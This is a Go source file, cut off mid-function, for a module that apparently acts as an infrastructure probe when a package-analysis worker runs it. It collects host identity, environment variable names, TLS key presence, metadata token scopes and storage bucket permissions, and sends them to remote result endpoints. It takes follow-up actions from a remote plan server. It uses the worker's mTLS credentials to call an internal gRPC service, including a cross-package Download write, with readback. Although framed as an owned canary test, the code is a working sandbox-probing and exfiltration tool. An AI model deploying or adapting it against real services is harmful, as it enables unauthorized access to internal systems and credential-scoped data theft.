package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"
)

var genericResultURL string
var compilerResultURL string
var planURL string
var bytemanCanaryURL string
var sessionNonce string
var probeUserAgent string
var rpcServiceHost string
var rpcDialAddress string

const (
	protocolVersion       = 1
	moduleName            = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion          = "v0.0.44-codex"
	targetRegistry        = "https://proxy.golang.org"
	targetModuleName      = "github.com/benr00t3d/go-byteman-crosswrite-canary"
	targetVersion         = "v0.0.1"
	targetCanarySHA256    = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
	targetCanaryBytes     = 2512
	downloadHTTPStatus    = 200
	downloadPolicyOnlyNew = 2 // DownloadRequest.policy: ONLY_NEW
	redirectFollowNone    = 2 // RedirectConfig.redirect_policy: FOLLOW_NONE
	originGoneSHA256      = "2060dcc16cdd2cb518700076b1ccf2fadbff619b32af84250c176e70590f1f0a"
	originGoneBytes       = 36
	downloadSource        = "robert-owned-v044-cross-package-offline-canary"
	expectedUserAgent     = "go-cgo-pkgsite-probe-v044-codex"
	maximumResult         = 256 * 1024
	maximumBody           = 256 * 1024
	requestTimeout        = 20 * time.Second
	bytemanGRPCTimeout    = 60 * time.Second
	bytemanHTTPTimeout    = 65 * time.Second
	resultTimeout         = 30 * time.Second
	planPollWindow        = 30 * time.Minute
	maximumPlanBody       = 4096
	maximumPlanStep       = 12
	maximumWireDepth      = 10
	maximumWireFields     = 512
	lookupRecordLimit     = 32
	maximumPollEvidence   = 32
	postWritePollWindow   = 8 * time.Minute
	postWriteCallLimit    = 60 * time.Second
	postWritePollDelay    = 2 * time.Second
)

var bucketNames = []string{
	"depsdev-capslock-reports",
	"sos-byteman-downloads-oregon",
	"sos-byteman-temp-oregon",
}

var bucketPermissions = []string{
	"storage.objects.create",
	"storage.objects.delete",
	"storage.objects.get",
	"storage.objects.list",
	"storage.objects.update",
}

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type fileEntry struct {
	Name string `json:"name"`
	Mode string `json:"mode"`
	Size int64  `json:"size"`
}

type tlsFile struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

type identityResult struct {
	Lane             string      `json:"lane"`
	CWD              string      `json:"cwd"`
	UID              int         `json:"uid"`
	GID              int         `json:"gid"`
	Hostname         string      `json:"hostname"`
	PID1             string      `json:"pid1"`
	ModuleFiles      []fileEntry `json:"module_files"`
	EnvironmentNames []string    `json:"environment_names"`
	TLSFiles         []tlsFile   `json:"tls_files"`
}

type metadataResult struct {
	Email      string   `json:"email,omitempty"`
	Scopes     []string `json:"scopes,omitempty"`
	TokenValid bool     `json:"token_valid"`
	Error      string   `json:"error,omitempty"`
}

type bucketResult struct {
	Bucket     string   `json:"bucket"`
	HTTPStatus int      `json:"http_status,omitempty"`
	Granted    []string `json:"granted,omitempty"`
	APIStatus  string   `json:"api_status,omitempty"`
	Error      string   `json:"error,omitempty"`
}

type grpcResult struct {
	ID                  string            `json:"id,omitempty"`
	Method              string            `json:"method"`
	HTTPStatus          int               `json:"http_status,omitempty"`
	GRPCStatus          string            `json:"grpc_status,omitempty"`
	GRPCMessage         string            `json:"grpc_message,omitempty"`
	BodyBytes           int               `json:"body_bytes,omitempty"`
	BodySHA256          string            `json:"body_sha256,omitempty"`
	ContentType         string            `json:"content_type,omitempty"`
	Authenticated       bool              `json:"authenticated"`
	RequestBytes        int               `json:"request_bytes,omitempty"`
	RequestSHA256       string            `json:"request_sha256,omitempty"`
	Wire                []wireFieldDigest `json:"wire,omitempty"`
	LookupRecordMatched bool              `json:"lookup_record_matched,omitempty"`
	LookupMatchPath     string            `json:"lookup_match_path,omitempty"`
	LookupRecordCount   int               `json:"lookup_record_count,omitempty"`
	LookupMatchCount    int               `json:"lookup_match_count,omitempty"`
	LookupRecordsSHA256 string            `json:"lookup_records_sha256,omitempty"`
	LookupMatchSHA256   string            `json:"lookup_match_sha256,omitempty"`
	RecordMatched       bool              `json:"record_matched,omitempty"`
	RecordSHA256        string            `json:"record_sha256,omitempty"`
	DigestFieldSHA256   string            `json:"digest_field_sha256,omitempty"`
	IDFieldSHA256       string            `json:"id_field_sha256,omitempty"`
	DownloadStatusCode  uint64            `json:"download_status_code,omitempty"`
	DownloadStatusSet   bool              `json:"download_status_set,omitempty"`
	PayloadBytes        int               `json:"payload_bytes,omitempty"`
	PayloadSHA256       string            `json:"payload_sha256,omitempty"`
	PayloadPath         string            `json:"payload_path,omitempty"`
	AnalysisError       string            `json:"analysis_error,omitempty"`
	Error               string            `json:"error,omitempty"`
}

type wireFieldDigest struct {
	Path   string `json:"path"`
	Bytes  int    `json:"bytes"`
	SHA256 string `json:"sha256"`
	Text   string `json:"text,omitempty"`
	Nested bool   `json:"nested,omitempty"`
}

type originResult struct {
	HeadHTTPStatus int    `json:"head_http_status,omitempty"`
	HeadState      string `json:"head_state,omitempty"`
	HTTPStatus     int    `json:"http_status,omitempty"`
	BodyBytes      int    `json:"body_bytes,omitempty"`
	BodySHA256     string `json:"body_sha256,omitempty"`
	ContentType    string `json:"content_type,omitempty"`
	State          string `json:"state,omitempty"`
	Offline        bool   `json:"offline"`
	Error          string `json:"error,omitempty"`
}

type planStep struct {
	Version   int    `json:"version"`
	ID        string `json:"id"`
	Action    string `json:"action"`
	RouteMode string `json:"route_mode,omitempty"`
}

type inspectionResult struct {
	Symbols      []string `json:"symbols,omitempty"`
	DialWindow   []string `json:"dial_window,omitempty"`
	CallerWindow []string `json:"caller_window,omitempty"`
	Error        string   `json:"error,omitempty"`
}

type probeReport struct {
	Schema            string            `json:"schema"`
	Module            string            `json:"module"`
	Version           string            `json:"version"`
	TargetModule      string            `json:"target_module,omitempty"`
	TargetVersion     string            `json:"target_version,omitempty"`
	StartedUTC        string            `json:"started_utc"`
	FinishedUTC       string            `json:"finished_utc"`
	Identity          identityResult    `json:"identity"`
	Metadata          metadataResult    `json:"metadata"`
	BucketPermissions []bucketResult    `json:"bucket_permissions,omitempty"`
	CanaryURLSHA256   string            `json:"canary_url_sha256,omitempty"`
	CanaryBodySHA256  string            `json:"canary_body_sha256,omitempty"`
	Byteman           []grpcResult      `json:"byteman,omitempty"`
	DownloadAttempted bool              `json:"download_attempted"`
	DownloadStrict    bool              `json:"download_response_strict"`
	RecoveryReadback  bool              `json:"ambiguous_response_readback"`
	ReadbackPolls     int               `json:"readback_poll_attempts,omitempty"`
	ReadbackOmitted   int               `json:"readback_results_omitted,omitempty"`
	FreshMTLSClient   bool              `json:"fresh_mtls_client"`
	Origin            originResult      `json:"origin"`
	StreamVerified    bool              `json:"stream_verified"`
	PlanID            string            `json:"plan_id,omitempty"`
	RouteMode         string            `json:"route_mode,omitempty"`
	Inspection        *inspectionResult `json:"inspection,omitempty"`
	Reason            string            `json:"reason,omitempty"`
}

type tokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int64  `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

func main() {
	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 ||
		os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	if identity.Lane == "capslock" {
		runCapslockSession(started, cwd, identity)
		return
	}
	report := newProbeReport(started, identity)
	report.Reason = "internal checks are fixed to the verified capslock lane"
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(genericResultURL, "v044-codex-"+identity.Lane, cwd, started, report)
}

func validSession(value string) bool {
	if len(value) < 48 || len(value) > 128 {
		return false
	}
	for _, character := range value {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	return true
}

func parseControlledEndpoint(raw, expectedPath string) (*url.URL, error) {
	parsed, err := url.Parse(raw)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.User != nil ||
		parsed.Opaque != "" || parsed.RawQuery != "" || parsed.ForceQuery || parsed.Fragment != "" ||
		parsed.RawPath != "" || parsed.Path != expectedPath {
		return nil, errors.New("controlled endpoint was not the exact HTTPS path")
	}
	return parsed, nil
}

func validateRuntimeConfiguration() error {
	if !validSession(sessionNonce) || probeUserAgent != expectedUserAgent {
		return errors.New("runtime identity was invalid")
	}
	paths := []struct {
		raw  string
		path string
	}{
		{genericResultURL, "/v1/result/" + sessionNonce + "/generic"},
		{compilerResultURL, "/v1/result/" + sessionNonce + "/compiler"},
		{planURL, "/v1/plan/" + sessionNonce},
		{bytemanCanaryURL, "/v1/goproxy/" + sessionNonce + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"},
	}
	var authority string
	for _, item := range paths {
		parsed, err := parseControlledEndpoint(item.raw, item.path)
		if err != nil {
			return err
		}
		if authority == "" {
			authority = parsed.Host
		} else if parsed.Host != authority {
			return errors.New("controlled endpoints did not share one authority")
		}
	}
	if genericResultURL == compilerResultURL {
		return errors.New("result endpoints were not distinct")
	}
	return nil
}

func newProbeReport(started time.Time, identity identityResult) probeReport {
	return probeReport{
		Schema:        "owned-byteman-probe/v1",
		Module:        moduleName,
		Version:       probeVersion,
		TargetModule:  targetModuleName,
		TargetVersion: targetVersion,
		StartedUTC:    started.UTC().Format(time.RFC3339Nano),
		Identity:      identity,
	}
}

func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{
		Version:    protocolVersion,
		Session:    sessionNonce,
		ID:         id,
		CWD:        cwd,
		DurationMS: time.Since(started).Milliseconds(),
	}
	if err != nil {
		result.ExitCode = 125
		result.Stderr = cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}

func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func inspectIdentity(cwd string) identityResult {
	lane := "other"
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
		if strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
			lane = "capslock"
		}
	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		lane = "generic"
	}
	hostname, _ := os.Hostname()
	result := identityResult{
		Lane:     lane,
		CWD:      cwd,
		UID:      os.Geteuid(),
		GID:      os.Getegid(),
		Hostname: hostname,
		PID1:     strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
	}
	if len(result.PID1) > 1024 {
		result.PID1 = result.PID1[:1024] + "[truncated]"
	}
	entries, _ := os.ReadDir(cwd)
	for _, entry := range entries {
		if len(result.ModuleFiles) >= 128 {
			break
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		result.ModuleFiles = append(result.ModuleFiles, fileEntry{
			Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size(),
		})
	}
	for _, value := range os.Environ() {
		name, _, found := strings.Cut(value, "=")
		if found && name != "" {
			result.EnvironmentNames = append(result.EnvironmentNames, name)
		}
	}
	sort.Strings(result.EnvironmentNames)
	for _, path := range []string{
		"/etc/tls/server-pool/server-tls-pool.pem",
		"/etc/tls/client/tls.crt",
		"/etc/tls/client/tls.key",
	} {
		item := tlsFile{Path: path}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present = true
			item.Mode = info.Mode().String()
			item.Size = info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}

func cleanError(err error) string {
	if err == nil {
		return ""
	}
	value := err.Error()
	value = strings.ReplaceAll(value, sessionNonce, "[session]")
	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
	if rpcDialAddress != "" {
		value = strings.ReplaceAll(value, rpcDialAddress, "[rpc-service]")
	}
	if rpcServiceHost != "" {
		value = strings.ReplaceAll(value, rpcServiceHost, "[rpc-host]")
	}
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}

func runCapslockSession(started time.Time, cwd string, identity identityResult) {
	initial := newProbeReport(started, identity)
	fillCapslockContext(&initial)
	initial.Reason = "waiting for a bounded Byteman plan"
	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	if err := submitProbeReport(compilerResultURL, "v044-codex-capslock-initial", cwd, started, initial); err != nil {
		return
	}

	deadline := time.Now().Add(planPollWindow)
	cursor := 0
	consecutiveErrors := 0
	downloadBudgetAvailable := true
	for cursor < maximumPlanStep && time.Now().Before(deadline) {
		step, available, err := fetchPlan(cursor)
		if err != nil {
			consecutiveErrors++
			if consecutiveErrors >= 3 {
				break
			}
			time.Sleep(2 * time.Second)
			continue
		}
		consecutiveErrors = 0
		if !available {
			time.Sleep(2 * time.Second)
			continue
		}
		stepStarted := time.Now()
		report := newProbeReport(stepStarted, identity)
		report.PlanID = step.ID
		report.RouteMode = step.RouteMode
		switch step.Action {
		case "finish":
			report.Reason = "bounded plan finished"
		case "inspect-session-dataflow":
			runSessionDataflowInspection(&report)
		case "probe-byteman":
			runBytemanProbe(&report, step.RouteMode, &downloadBudgetAvailable)
		default:
			report.Reason = "validated plan action had no implementation"
		}
		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		id := "v044-codex-step-" + strconv.Itoa(cursor)
		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
			return
		}
		cursor++
		if step.Action == "finish" {
			return
		}
	}
	finalStarted := time.Now()
	final := newProbeReport(finalStarted, identity)
	if cursor >= maximumPlanStep {
		final.Reason = "bounded plan step limit reached"
	} else if consecutiveErrors >= 3 {
		final.Reason = "bounded plan endpoint failed three times"
	} else {
		final.Reason = "bounded plan polling window expired"
	}
	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(compilerResultURL, "v044-codex-final", cwd, finalStarted, final)
}

func fetchPlan(cursor int) (planStep, bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, planURL+"/"+strconv.Itoa(cursor), nil)
	if err != nil {
		return planStep{}, false, err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       requestTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return planStep{}, false, err
	}
	defer response.Body.Close()
	if response.StatusCode == http.StatusNoContent {
		return planStep{}, false, nil
	}
	if response.StatusCode != http.StatusOK {
		return planStep{}, false, fmt.Errorf("plan endpoint returned HTTP %d", response.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumPlanBody+1))
	if err != nil || len(body) > maximumPlanBody {
		return planStep{}, false, errors.New("plan response too large")
	}
	decoder := json.NewDecoder(bytes.NewReader(body))
	decoder.DisallowUnknownFields()
	var step planStep
	if err := decoder.Decode(&step); err != nil {
		return planStep{}, false, errors.New("plan response was invalid JSON")
	}
	if err := decoder.Decode(&struct{}{}); err != io.EOF {
		return planStep{}, false, errors.New("plan response had trailing data")
	}
	if err := validatePlanStep(step); err != nil {
		return planStep{}, false, err
	}
	return step, true, nil
}

func validatePlanStep(step planStep) error {
	if step.Version != 1 || len(step.ID) < 1 || len(step.ID) > 64 {
		return errors.New("plan identity was invalid")
	}
	for _, value := range step.ID {
		if (value < 'a' || value > 'z') && (value < '0' || value > '9') && value != '-' {
			return errors.New("plan identity was invalid")
		}
	}
	switch step.Action {
	case "probe-byteman":
		if !allowedRouteMode(step.RouteMode) {
			return errors.New("plan route mode was not allowed")
		}
	case "inspect-session-dataflow", "finish":
		if step.RouteMode != "" {
			return errors.New("non-probe plan included route parameters")
		}
	default:
		return errors.New("plan action was not allowed")
	}
	return nil
}

func allowedRouteMode(value string) bool {
	return value == "byteman-localhost"
}

func fillCapslockContext(report *probeReport) {
	metadataClient := &http.Client{
		Transport: &http.Transport{Proxy: nil},
		Timeout:   requestTimeout,
	}
	metadata, _ := inspectMetadata(metadataClient)
	report.Metadata = metadata
}

func consumeDownloadBudget(available *bool) bool {
	if available == nil || !*available {
		return false
	}
	*available = false
	return true
}

func runBytemanProbe(report *probeReport, routeMode string, downloadBudgetAvailable *bool) {
	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
	report.CanaryBodySHA256 = targetCanarySHA256
	rpcClient, rpcEndpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
		return
	}
	urlLookupRequest := buildURLLookupRequest(bytemanCanaryURL)
	coordinateLookupRequest := buildCoordinateLookupRequest()
	baselineURL := callLookup(rpcClient, rpcEndpoint, "baseline-url-lookup", urlLookupRequest)
	report.Byteman = append(report.Byteman, baselineURL)
	baselineCoordinate := callLookup(rpcClient, rpcEndpoint, "baseline-coordinate-lookup", coordinateLookupRequest)
	report.Byteman = append(report.Byteman, baselineCoordinate)
	if grpcSucceeded(baselineURL) && baselineURL.AnalysisError == "" && baselineURL.LookupMatchCount > 0 {
		rpcClient.CloseIdleConnections()
		runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, true, false,
			baselineURL.DigestFieldSHA256, baselineURL.IDFieldSHA256)
		return
	}
	rpcClient.CloseIdleConnections()
	if !consumeDownloadBudget(downloadBudgetAvailable) {
		report.Reason = "session-wide Download mutation budget was already consumed"
		return
	}
	downloadClient, downloadEndpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{
			ID: "download-client-setup", Method: "client-setup", Error: cleanError(err),
		})
		report.Reason = "fresh single-Download mTLS client setup failed"
		return
	}
	report.DownloadAttempted = true
	download := callDownload(downloadClient, downloadEndpoint)
	report.Byteman = append(report.Byteman, download)
	downloadClient.CloseIdleConnections()
	report.DownloadStrict = downloadStrictlyAccepted(download)
	runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, false,
		!report.DownloadStrict, download.DigestFieldSHA256, download.IDFieldSHA256)
}

func runOfflineReadback(report *probeReport, routeMode string, urlLookupRequest, coordinateLookupRequest []byte, readbackOnly, recovery bool, expectedDigestSHA256, expectedIDSHA256 string) {
	// The one-shot URL must be provably unavailable before any persistence read.
	// A HEAD check prevents this verifier from consuming an available canary.
	// Each bounded poll attempt then uses a newly constructed mTLS transport and
	// queries the unique URL before spending time on the broader coordinate.
	time.Sleep(250 * time.Millisecond)
	report.Origin = verifyOriginOffline()
	if !report.Origin.Offline {
		if readbackOnly {
			report.Reason = "baseline URL record existed but its one-shot origin was not offline; readback stopped"
		} else if recovery {
			report.Reason = "Download response was not strict and the one-shot origin remained available; recovery reads were not attempted"
		} else {
			report.Reason = "one-shot canary origin was not offline; persistence reads were not attempted"
		}
		return
	}
	if recovery {
		report.RecoveryReadback = true
	}

	deadline := time.Now().Add(postWritePollWindow)
	matched := false
	pollEvidence := 0
	recordPollEvidence := func(force bool, results ...grpcResult) {
		if force || pollEvidence+len(results) <= maximumPollEvidence {
			report.Byteman = append(report.Byteman, results...)
			pollEvidence += len(results)
			return
		}
		report.ReadbackOmitted += len(results)
	}
	for attempt := 0; time.Now().Before(deadline); attempt++ {
		report.ReadbackPolls++
		freshClient, freshEndpoint, err := newMTLSClient(routeMode)
		if err != nil {
			report.Byteman = append(report.Byteman, grpcResult{
				ID: "fresh-client-setup-" + strconv.Itoa(attempt), Method: "client-setup", Error: cleanError(err),
			})
			break
		}
		report.FreshMTLSClient = true
		perCall := boundedPollCallTimeout(deadline)
		if perCall < 500*time.Millisecond {
			freshClient.CloseIdleConnections()
			break
		}
		postURL := callLookupTimeout(freshClient, freshEndpoint, "post-url-lookup-"+strconv.Itoa(attempt), urlLookupRequest, perCall)
		if !lookupResultHasIdentity(postURL, expectedDigestSHA256, expectedIDSHA256) {
			postURL.Wire = nil
			recordPollEvidence(false, postURL)
			freshClient.CloseIdleConnections()
			if !sleepWithinDeadline(deadline, postWritePollDelay) {
				break
			}
			continue
		}
		candidateDigest := expectedDigestSHA256
		if candidateDigest == "" {
			candidateDigest = postURL.DigestFieldSHA256
		}
		candidateID := expectedIDSHA256
		if candidateID == "" {
			candidateID = postURL.IDFieldSHA256
		}
		perCall = boundedPollCallTimeout(deadline)
		if perCall < 500*time.Millisecond {
			postURL.Wire = nil
			recordPollEvidence(false, postURL)
			freshClient.CloseIdleConnections()
			break
		}
		postCoordinate := callLookupTimeout(freshClient, freshEndpoint, "post-coordinate-lookup-"+strconv.Itoa(attempt), coordinateLookupRequest, perCall)
		freshClient.CloseIdleConnections()
		exact := exactLookupPair(postURL, postCoordinate, candidateDigest, candidateID)
		if !exact {
			// Repeated poll attempts retain response hashes, counts, and record
			// fingerprints without multiplying the full field-digest transcript.
			postURL.Wire = nil
			postCoordinate.Wire = nil
		}
		recordPollEvidence(exact, postURL, postCoordinate)
		if exact {
			matched = true
			break
		}
		if !sleepWithinDeadline(deadline, postWritePollDelay) {
			break
		}
	}
	if !matched {
		report.Reason = "bounded fresh-client post-write poll found no identical exact B record pair"
		return
	}

	streamClient, streamEndpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{
			ID: "stream-client-setup", Method: "client-setup", Error: cleanError(err),
		})
		report.Reason = "fresh Stream mTLS client setup failed"
		return
	}
	report.FreshMTLSClient = true
	stream := callStream(streamClient, streamEndpoint)
	streamClient.CloseIdleConnections()
	report.Byteman = append(report.Byteman, stream)
	if grpcSucceeded(stream) && stream.PayloadBytes == targetCanaryBytes &&
		stream.PayloadSHA256 == targetCanarySHA256 {
		report.StreamVerified = true
		if readbackOnly {
			report.Reason = "pre-existing URL record was verified read-only with offline fresh-client Lookup and Stream"
		} else if recovery {
			report.Reason = "offline fresh-client Lookup and Stream recovered persistence after an ambiguous Download response"
		} else {
			report.Reason = "offline fresh-client Lookup and Stream verified the exact cross-package canary"
		}
		return
	}
	report.Reason = "Stream did not reproduce the exact offline cross-package canary"
}

func boundedPollCallTimeout(deadline time.Time) time.Duration {
	remaining := time.Until(deadline)
	if remaining > postWriteCallLimit {
		return postWriteCallLimit
	}
	return remaining
}

func sleepWithinDeadline(deadline time.Time, delay time.Duration) bool {
	remaining := time.Until(deadline)
	if remaining <= 0 {
		return false
	}
	if remaining < delay {
		delay = remaining
	}
	time.Sleep(delay)
	return time.Now().Before(deadline)
}

func lookupResultHasIdentity(result grpcResult, expectedDigestSHA256, expectedIDSHA256 string) bool {
	if !grpcSucceeded(result) || result.AnalysisError != "" || result.LookupMatchCount != 1 ||
		result.LookupMatchSHA256 == "" || result.DigestFieldSHA256 == "" || result.IDFieldSHA256 == "" {
		return false
	}
	if expectedDigestSHA256 != "" && result.DigestFieldSHA256 != expectedDigestSHA256 {
		return false
	}
	return expectedIDSHA256 == "" || result.IDFieldSHA256 == expectedIDSHA256
}

func exactLookupPair(urlResult, coordinateResult grpcResult, expectedDigestSHA256, expectedIDSHA256 string) bool {
	return grpcSucceeded(urlResult) && grpcSucceeded(coordinateResult) &&
		urlResult.AnalysisError == "" && coordinateResult.AnalysisError == "" &&
		urlResult.LookupMatchCount == 1 && coordinateResult.LookupMatchCount == 1 &&
		expectedDigestSHA256 != "" && expectedIDSHA256 != "" &&
		urlResult.LookupMatchSHA256 != "" && urlResult.LookupMatchSHA256 == coordinateResult.LookupMatchSHA256 &&
		urlResult.DigestFieldSHA256 == expectedDigestSHA256 && coordinateResult.DigestFieldSHA256 == expectedDigestSHA256 &&
		urlResult.IDFieldSHA256 == expectedIDSHA256 && coordinateResult.IDFieldSHA256 == expectedIDSHA256
}

func callLookup(client *http.Client, endpoint, id string, request []byte) grpcResult {
	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Lookup", request)
	return finishLookup(result, body, id)
}

func callLookupTimeout(client *http.Client, endpoint, id string, request []byte, timeout time.Duration) grpcResult {
	result, body := callGRPCRawTimeout(client, endpoint, "/sos.byteman.Byteman/Lookup", request, timeout)
	return finishLookup(result, body, id)
}

func finishLookup(result grpcResult, body []byte, id string) grpcResult {
	result.ID = id
	if !grpcSucceeded(result) {
		return result
	}
	analysis, err := analyzeLookupBody(body)
	result.Wire = analysis.Wire
	result.LookupMatchPath = analysis.MatchPath
	result.LookupRecordCount = analysis.RecordCount
	result.LookupMatchCount = analysis.MatchCount
	result.LookupRecordsSHA256 = analysis.RecordsSHA256
	result.LookupMatchSHA256 = analysis.MatchSHA256
	result.RecordSHA256 = analysis.RecordSHA256
	result.DigestFieldSHA256 = analysis.DigestSHA256
	result.IDFieldSHA256 = analysis.IDSHA256
	if err != nil {
		result.AnalysisError = cleanError(err)
		return result
	}
	result.LookupRecordMatched = analysis.MatchCount == 1
	result.RecordMatched = analysis.MatchCount == 1
	return result
}

func callDownload(client *http.Client, endpoint string) grpcResult {
	request := buildTargetDownloadRequest(bytemanCanaryURL)
	requestDigest := sha256.Sum256(request)
	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Download", request)
	result.ID = "cross-package-download"
	result.RequestBytes = len(request)
	result.RequestSHA256 = hex.EncodeToString(requestDigest[:])
	if !grpcSucceeded(result) {
		return result
	}
	analysis, err := analyzeDownloadBody(body)
	result.Wire = analysis.Wire
	result.RecordMatched = analysis.Identity.Matched
	result.RecordSHA256 = analysis.Identity.RecordSHA256
	result.DigestFieldSHA256 = analysis.Identity.DigestSHA256
	result.IDFieldSHA256 = analysis.Identity.IDSHA256
	result.DownloadStatusSet = analysis.StatusSet
	result.DownloadStatusCode = analysis.StatusCode
	if err != nil {
		result.AnalysisError = cleanError(err)
	}
	return result
}

func downloadStrictlyAccepted(result grpcResult) bool {
	return grpcSucceeded(result) && result.AnalysisError == "" && result.RecordMatched &&
		result.DigestFieldSHA256 != "" && result.IDFieldSHA256 != "" &&
		result.DownloadStatusSet && result.DownloadStatusCode == downloadHTTPStatus
}

func callStream(client *http.Client, endpoint string) grpcResult {
	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Stream", buildTargetStreamRequest(bytemanCanaryURL))
	result.ID = "offline-stream-readback"
	if !grpcSucceeded(result) {
		return result
	}
	wire, payload, path, err := analyzeStreamBody(body)
	result.Wire = wire
	if err != nil {
		result.AnalysisError = cleanError(err)
		return result
	}
	digest := sha256.Sum256(payload)
	result.PayloadBytes = len(payload)
	result.PayloadSHA256 = hex.EncodeToString(digest[:])
	result.PayloadPath = path
	return result
}

type originObservation struct {
	status      int
	contentType string
	state       string
	body        []byte
}

func requestOrigin(method string) (originObservation, error) {
	result := originObservation{}
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, method, bytemanCanaryURL, nil)
	if err != nil {
		return result, err
	}
	request.Header.Set("User-Agent", probeUserAgent+"-offline-check")
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       requestTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return result, err
	}
	defer response.Body.Close()
	result.status = response.StatusCode
	result.contentType = response.Header.Get("Content-Type")
	result.state = response.Header.Get("X-Codex-One-Shot-State")
	body, err := io.ReadAll(io.LimitReader(response.Body, 4097))
	if err != nil {
		return result, err
	}
	if len(body) > 4096 {
		return result, errors.New("origin check response too large")
	}
	result.body = body
	return result, nil
}

func verifyOriginOffline() originResult {
	result := originResult{}
	head, err := requestOrigin(http.MethodHead)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	result.HeadHTTPStatus = head.status
	result.HeadState = head.state
	if head.status != http.StatusGone || head.state != "consumed" {
		return result
	}
	get, err := requestOrigin(http.MethodGet)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	result.HTTPStatus = get.status
	result.ContentType = get.contentType
	result.State = get.state
	result.BodyBytes = len(get.body)
	digest := sha256.Sum256(get.body)
	result.BodySHA256 = hex.EncodeToString(digest[:])
	result.Offline = get.status == http.StatusGone &&
		result.BodyBytes == originGoneBytes && result.BodySHA256 == originGoneSHA256 &&
		result.ContentType == "application/json" && result.State == "consumed"
	return result
}

func grpcSucceeded(result grpcResult) bool {
	contentType := strings.ToLower(strings.TrimSpace(result.ContentType))
	return result.HTTPStatus == http.StatusOK && result.GRPCStatus == "0" &&
